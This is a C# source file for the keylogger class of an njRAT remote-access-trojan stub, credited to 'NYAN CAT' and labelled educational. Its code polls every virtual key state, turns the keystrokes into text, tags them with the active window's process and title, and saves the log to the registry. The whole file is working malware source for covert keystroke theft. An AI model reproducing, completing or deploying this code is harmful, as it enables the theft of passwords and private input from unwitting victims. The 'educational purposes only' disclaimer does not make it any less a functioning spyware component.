using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace Lime
{


    /*
     * │ Author       : NYAN CAT
     * │ Name         : njRAT C# Stub | Fixed for powershell
     * │ Contact      : https:github.com/NYAN-x-CAT
     * 
     * This program is distributed for educational purposes only.
     */


    public class Keylogger
    {
        public Keylogger()
        {
            lastKey = Keys.None;
            Logs = "";
            vn = "[kl]";
            keyboard = new Keyboard();
        }

        [DllImport("user32.dll")]
        private static extern int ToUnicodeEx(uint a, uint b, byte[] c, [MarshalAs(UnmanagedType.LPWStr)] [Out] StringBuilder d, int e, uint f, IntPtr g);

        [DllImport("user32.dll")]
        private static extern bool GetKeyboardState(byte[] a);

        [DllImport("user32.dll")]
        private static extern uint MapVirtualKey(uint a, uint b);

        [DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        private static extern int GetWindowThreadProcessId(IntPtr a, ref int b);

        [DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        private static extern int GetKeyboardLayout(int a);

        [DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        private static extern short GetAsyncKeyState(int a);

        private string AV()
        {
            try
            {
                IntPtr foregroundWindow = Program.GetForegroundWindow();
                int processId = 0;
                GetWindowThreadProcessId(foregroundWindow, ref processId);
                Process processById = Process.GetProcessById(processId);
                if (!((foregroundWindow.ToInt32() == this.LastAV & Operators.CompareString(this.LastAS, processById.MainWindowTitle, false) == 0) | processById.MainWindowTitle.Length == 0))
                {
                    this.LastAV = foregroundWindow.ToInt32();
                    this.LastAS = processById.MainWindowTitle;
                    return string.Concat(new string[]
                    {
                        "\r\n\u0001",
                        DateAndTime.Now.ToString("yy/MM/dd "),
                        processById.ProcessName,
                        " ",
                        this.LastAS,
                        "\u0001\r\n"
                    });
                }
            }
            catch { }
            return "";
        }

        private static string VKCodeToUnicode(uint a)
        {
            try
            {
                StringBuilder stringBuilder = new StringBuilder();
                byte[] array = new byte[255];
                string result;
                if (!GetKeyboardState(array))
                {
                    result = "";
                    return result;
                }
                uint b = MapVirtualKey(a, 0u);
                IntPtr foregroundWindow = Program.GetForegroundWindow();
                IntPtr arg_3B_0 = foregroundWindow;
                int num = 0;
                int windowThreadProcessId = GetWindowThreadProcessId(arg_3B_0, ref num);
                IntPtr g = (IntPtr)GetKeyboardLayout(windowThreadProcessId);
                ToUnicodeEx(a, b, array, stringBuilder, 5, 0u, g);
                result = stringBuilder.ToString();
                return result;
            }
            catch { }
            return (checked((Keys)a)).ToString();
        }

        private string Fix(Keys k)
        {
            bool flag = keyboard.ShiftKeyDown;
            if (keyboard.CapsLock)
            {
                if (flag)
                {
                    flag = false;
                }
                else
                {
                    flag = true;
                }
            }
            checked
            {
                string result;
                try
                {
                    if (k == Keys.Delete || k == Keys.Back)
                    {
                        result = "[" + k.ToString() + "]";
                    }
                    else if (k == Keys.LShiftKey || k == Keys.RShiftKey || k == Keys.Shift || k == Keys.ShiftKey || k == Keys.Control || k == Keys.ControlKey || k == Keys.RControlKey || k == Keys.LControlKey || k == Keys.Alt || k == Keys.F1 || k == Keys.F2 || k == Keys.F3 || k == Keys.F4 || k == Keys.F5 || k == Keys.F6 || k == Keys.F7 || k == Keys.F8 || k == Keys.F9 || k == Keys.F10 || k == Keys.F11 || k == Keys.F12 || k == Keys.End)
                    {
                        result = "";
                    }
                    else if (k == Keys.Space)
                    {
                        result = " ";
                    }
                    else if (k == Keys.Return || k == Keys.Return)
                    {
                        if (this.Logs.EndsWith("[ENTER]\r\n"))
                        {
                            result = "";
                        }
                        else
                        {
                            result = "[ENTER]\r\n";
                        }
                    }
                    else if (k == Keys.Tab)
                    {
                        result = "[TAP]\r\n";
                    }
                    else if (flag)
                    {
                        result = VKCodeToUnicode((uint)k).ToUpper();
                    }
                    else
                    {
                        result = VKCodeToUnicode((uint)k);
                    }
                }
                catch (Exception expr_148)
                {
                    ProjectData.SetProjectError(expr_148);
                    if (flag)
                    {
                        result = Strings.ChrW((int)k).ToString().ToUpper();
                        ProjectData.ClearProjectError();
                    }
                    else
                    {
                        result = Strings.ChrW((int)k).ToString().ToLower();
                        ProjectData.ClearProjectError();
                    }
                }
                return result;
            }
        }

        public void WRK()
        {
            this.Logs = Conversions.ToString(Program.GetValueFromRegistry(this.vn, ""));
            checked
            {
                try
                {
                    int num = 0;
                    while (true)
                    {
                        num++;
                        int num2 = 0;
                        do
                        {
                            if (GetAsyncKeyState(num2) == -32767 & !keyboard.CtrlKeyDown)
                            {
                                Keys k = (Keys)num2;
                                string text = this.Fix(k);
                                if (text.Length > 0)
                                {
                                    this.Logs += this.AV();
                                    this.Logs += text;
                                }
                                this.lastKey = k;
                            }
                            num2++;
                        }
                        while (num2 <= 255);
                        if (num == 1000)
                        {
                            num = 0;
                            int num3 = Conversions.ToInteger("20") * 1024;
                            if (this.Logs.Length > num3)
                            {
                                this.Logs = this.Logs.Remove(0, this.Logs.Length - num3);
                            }
                            Program.SaveValueOnRegistry(this.vn, this.Logs, RegistryValueKind.String);
                        }
                        Thread.Sleep(1);
                    }
                }
                catch { }
            }
        }

        private int LastAV;

        private string LastAS;

        private Keys lastKey;

        public string Logs;

        public string vn;

        public Keyboard keyboard;
    }
}
